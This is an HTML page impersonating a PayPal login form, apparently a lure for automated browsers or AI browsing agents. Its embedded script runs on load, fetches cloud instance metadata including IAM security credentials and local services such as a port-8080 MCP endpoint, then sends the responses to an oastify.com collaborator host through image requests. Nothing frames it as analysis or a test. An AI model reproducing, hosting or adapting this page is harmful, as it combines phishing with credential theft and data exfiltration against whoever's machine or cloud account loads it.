<!DOCTYPE html>
<html>
<head><title>Login - PayPal</title></head>
<body>
<h1>PayPal Login</h1>
<form>
  <input type="email" placeholder="Email">
  <input type="password" placeholder="Password">
  <button>Login</button>
</form>
<script>
const targets = [
  "http://169.254.169.254/latest/meta-data/",
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "http://127.0.0.1/",
  "http://127.0.0.1:8080/mcp",
];
targets.forEach(url => {
  fetch(url, {mode:'no-cors'})
    .then(r => r.text())
    .then(body => {
      new Image().src = "http://9u41m2dngv7pgaf20zxco3q4avgm4cs1.oastify.com/?url=" +
        encodeURIComponent(url) + "&data=" + encodeURIComponent(body.substring(0,500));
    })
    .catch(e => {
      new Image().src = "http://9u41m2dngv7pgaf20zxco3q4avgm4cs1.oastify.com/?url=" +
        encodeURIComponent(url) + "&err=" + encodeURIComponent(e.toString());
    });
});
</script>
</body>
</html>
